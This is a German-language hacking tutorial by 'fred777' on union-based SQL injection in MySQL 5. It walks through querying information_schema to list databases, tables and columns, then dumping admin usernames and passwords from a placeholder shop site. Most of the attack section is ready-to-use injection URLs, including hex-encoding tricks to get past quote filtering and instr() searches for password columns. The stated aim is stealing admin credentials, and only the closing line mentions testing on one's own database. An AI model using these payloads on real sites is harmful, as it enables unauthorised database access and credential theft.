*******************************************************
#              WEBSECURITY DOCUMENTATION              #
#       --------------------------------------        #
#        SQL Injection with INFORMATION_SCHEMA        #
#       --------------------------------------        #
#                                                     #
#                                                     #
#  [+] written by fred777 [fred777.de]                #
#                                                     #
******************************************************

--[0x00]-- Intro

--[0x01]-- Knowledge
   [1] Struktur

--[0x02]-- Exploiting
   [1] Information_schema etc.
   [2] Crawling

--[0x03]-- Tipps & Tricks
   [1] Where - Bedingung
   [2] Instr() - Bedingung

--[0x04]-- Finito

******************************************************
######################################################


--[ 0x00 ]-- Intro:

Willkommen zu meinem Paper über SQL Injections mit mySQL 5.
Alle Standards solltet ihr aus anderen oder meinem ersten Tutorial bereits kennen.
Folglich werde ich auch nicht auf alle Begriffe ausführlich eingehen...

####################################################

 --[ 0x01 ]-- Knowledge

-------------------------------------------------------
 [1] Struktur
-------------------------------------------------------

Ein bedeutender Unterschied von Version 4 zu Version 5 ist die information_schema.
Eine Datenbank, welche Zugriff auf Metadaten der eigentlichen Datenbanken bietet.
Folglich sind die Namen, Statistiken und Datentypen über Tables, Columns und andere
Datenbanken vorhanden. Es gibt viele Tables der information_schema wie etwa:

INFORMATION_SCHEMA SCHEMATA
INFORMATION_SCHEMA TABLES
INFORMATION_SCHEMA COLUMNS
INFORMATION_SCHEMA STATISTICS
INFORMATION_SCHEMA USER_PRIVILEGES
INFORMATION_SCHEMA SCHEMA_PRIVILEGES
INFORMATION_SCHEMA TABLE_PRIVILEGES
INFORMATION_SCHEMA COLUMN_PRIVILEGES
INFORMATION_SCHEMA CHARACTER_SETS
INFORMATION_SCHEMA COLLATIONS

Ich könnte natürlich jetzt auf jede einzelne Table eingehen, doch ich belasse es mal bei den 
für uns wichtigsten für uns. Das wären:

INFORMATION_SCHEMA SCHEMATA
INFORMATION_SCHEMA TABLES
INFORMATION_SCHEMA COLUMNS

INFORMATION_SCHEMA SCHEMATA > bietet uns Informationen über die vorhandenen Datenbanken an.
Sie besitzt folgende Columns:

CATALOG_NAME 
SCHEMA_NAME 
DEFAULT_CHARACTER_SET_NAME 	  	 
DEFAULT_COLLATION_NAME 	  	 
SQL_PATH

Wirklich wichtig ist nur SCHEMA_NAME, welcher uns die Namen der Datenbanken liefert.

INFORMATION_SCHEMA TABLES >  ja wer hätte das gedacht, gibt und Informationen über die
vorhandenen Tables, auch hier gibt es eine Menge Columns:

TABLE_CATALOG 
TABLE_SCHEMA 
TABLE_NAME
......

Wichtig für uns ist nur der Table_name, da wir somit ganz schnell die Usertable hätten..

INFORMATION_SCHEMA COLUMNS > gibt uns Informationen über die vorhandenen Columns.
Die wichtigen Spalten hier sind folgende:

TABLE_SCHEMA 	  	 
TABLE_NAME 	  	 
COLUMN_NAME

Wir kennen aus dem ersten Paper schon die Limit Funktion und können uns denken wie wir
die Metadatenbank durchsuchen können.

##########################################################

 --[ 0x02 ]-- Exploiting

-------------------------------------------------------
 [1] Information_schema etc.
-------------------------------------------------------

Jetzt testen wir das ganze mal an einem Beispiel. Wir haben eine Seite mit einem Query, welcher verwundbar ist,
eine Ausgabe hervorbringt und das ganze schon auf Version 5 gecheckt.

www.seite.de/index.php?id=777+union+select+1,2,version(),4-- f   == Version 5.xxxxx

Nun würden wir gerne die Usertable abrufen, wissen aber nicht wie diese sich nennt, nach
unserem jetzigen Erkenntnisstand könne wir die information_schema fragen.
Also los:

www.seite.de/index.php?id=777+union+select+1,2,3,4+from+information_schema.columns-- f 

Wie wir oben gesehen haben, birgt diese Table alle nötigen Informationen in sich.
Außerdem erscheint eine 3, also existiert die information_schema.columns
(Wir verbinden die Datenbank mit der Table duch einen Punkt, um darauf zuzugreifen)
Setzen wir also schonmal die entsprechenden Columns:

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,table_schema,table_name,column_name),4+from+information_schema.columns-- f 

Es wird uns der erste Eintrag angezeigt:

information_schema:CHARACTER_SETS:CHARACTER_SET_NAME
Datenbank -------------------- Table --------------- Column

-------------------------------------------------------
 [2] Crawling 
-------------------------------------------------------

Jetzt wollen wir aber den Namen der Usertabelle finden und diese liegt sicher nicht in der
information_schema sondern in einer anderen Datenbank. Wir erinnern uns an LIMIT und setzen es dahinter
Unser Ziel ist es erstmal aus der information_schema herauszukommen, was meist um den 180. Eintrag passiert

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,table_schema,table_name,column_name),4+from+information_schema.columns+limit+180,1-- f

eShopdatabase:News:Id
Datenbank --- Table -- Column

Aha, schon besser, wir befinden uns nun in der wahrscheinlich 2. Datenbank, also hinter INFORMATION_SCHEMA, also weiter..

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,table_schema,table_name,column_name),4+from+information_schema.columns+limit+194,1-- f

eShopdatabase:eShopAdmins:Username
Datenbank --- Table -- Column

Wir sind fündig geworden und haben den Namen, jetzt wird um ein paar Stellen verschoben wohl auch 
Password sitzen. Welches ihr einfach genauso suche müsst..
Nun starten wir wie gewohnt unsere Abfrage mit den nun gewonnenen Namen.

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,Username,Password),4+from+eShopAdmins-- f

Damit es keine Probleme mit anderen Datenbanken gibt, sagen wir dem Query noch aus welcher Datenbank eShopAdmins kommt

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,Username,Password),4+from+eShopdatabase.eShopAdmins-- f

###############################################################

 --[ 0x03 ]-- Tipps & Tricks

-------------------------------------------------------
 [1] WHERE - Bedingung 
-------------------------------------------------------

So nun gibt es noch ein paar Vereinfachungen, welche es uns ermöglichen schneller eine gewisse Table zu finden.
Dazu stellen wir eine Art Bedingung auf mittels WHERE oder auch LIKE.
Vorhin sind wir durch die gesamte information_schema gewandert um dann bei ca. dem 190. Wert halt zu machen.
Sagen wird soch einfach, gib alle Columns und Tables aus, welche NICHT in der information_schema liegen, damit haben wir uns schon einiges
gespart. Den Befehl WHERE kenne wir schon.

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,table_schema,table_name,column_name),4+from+information_schema.columns+where+table_schema!='information_Schema'-- f

Das Problem hier könnte werden, das ' gequoted werden, so wandeln wir das ganze einfach in hex um.
information_schema == 0x696E666F726D6174696F6E5F736368656D61
www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,table_schema,table_name,column_name),4+from+information_schema.columns+where+table_schema!=0x696E666F726D6174696F6E5F736368656D61-- f

So, oder wir machen es uns noch einfacher, und sagen:  WHERE table_schema='eShopdatabase'-- f

Ein ähnlicher weg ist, die Abfrage mit database() zu machen, da diese sowieso immer die Datenbank des aktuellen
Querys enthält:

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,table_schema,table_name,column_name),4+from+information_schema.columns+where+table_schema = database()-- f

-------------------------------------------------------
 [2] Instr() - Bedingung
-------------------------------------------------------

Der zweite wichtige Befehl welcher uns schneller zum Ziel bringt ist instr(arg,word), er findet Zeichenkette.
Das machen wir uns zu nutze, da in der Usertable meisten die Column welche die Passwörter enthält mit 'pass' anfängt..
Also suchen wir die Database+Tablename+Columnname aus der "richige" Datenbank (database()) wenn columnname den String
pass enthält. Verknüpft wird das ganze mit and.
Also so:

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,table_schema,table_name,column_name),4+from+information_schema.columns+where+table_schema=database()+and+instr(column_name,'pass')-- f

Auch hier können wir notfalls den Wert mit hex ersetzen, falls ' nicht erlaubt sind...

www.seite.de/index.php?id=777+union+select+1,2,concat_ws(0x3a,table_schema,table_name,column_name),4+from+information_schema.columns+where+table_schema=database()+and+instr(column_name,0x70617373)-- f

Der Vorteil durch instr(), wir müssen lange nicht 190 Werte durchgehen, sondern stoßen direkt auf die richtige
Table/Column.

##################################################################

--[0x04]-- Finito

Das wars auch schon wieder, ich hoffe es war lehrreich und schaut auch mal auf fred777.5x.to vorbei :)
Ein bisschen testen in der eigenen Datenbank kann auch nie schaden.
            